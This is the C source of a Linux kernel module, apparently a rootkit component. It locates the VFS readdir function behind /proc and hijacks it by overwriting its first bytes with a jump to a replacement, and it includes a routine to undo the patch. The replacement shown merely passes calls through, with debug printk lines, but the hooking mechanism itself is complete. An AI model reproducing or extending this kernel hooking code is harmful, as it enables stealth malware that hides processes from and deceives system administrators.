#include <linux/unistd.h>
#include <linux/types.h>
#include <linux/kernel.h>

#include "common.h"
#include "readdirHijack.h"

//void (*readdir_ptr)(long) = (void (*)(long)) readdir;
int (*readdir_ptr)(struct file *file, void *dirent, filldir_t filldir);
char readdirHijackBytes[NUM_HIJACK_BYTES];
char readdirOriginalBytes[NUM_HIJACK_BYTES];

// Taken from: http://www.poppopret.org/?p=251
void *get_vfs_readdir ( const char *path )
{
    void *ret;
    struct file *filep;

    if ( (filep = filp_open(path, O_RDONLY, 0)) == NULL )
        return NULL;

    ret = filep->f_op->readdir;

    filp_close(filep, 0);

    return ret;
}

int replacement_readdir(struct file *file, void *dirent, filldir_t filldir) {
   int returnValue;
   printk("Writing original bytes\n");
   writeHijackBytes(readdir_ptr, readdirOriginalBytes, NULL);
   printk("Calling original function\n");
   returnValue = readdir_ptr(file, dirent, filldir);
   printk("Writing back hijack function\n");
   writeHijackBytes(readdir_ptr, readdirHijackBytes, NULL);
   printk("Replacement completed successfully\n");
   return returnValue;
}

void hijack_readdir() {
   printk("Finding proc readdir\n");
   readdir_ptr = get_vfs_readdir("/proc");
   printk("Getting hijack bytes\n");
   getHijackBytes(replacement_readdir, readdirHijackBytes);
   printk("Hijacking function\n");
   writeHijackBytes(readdir_ptr, readdirHijackBytes, readdirOriginalBytes);
   printk("Hijack successful\n");
}

void unhijack_readdir() {
   writeHijackBytes(readdir_ptr, readdirOriginalBytes, NULL);
   printk("Unhijacked\n");
}
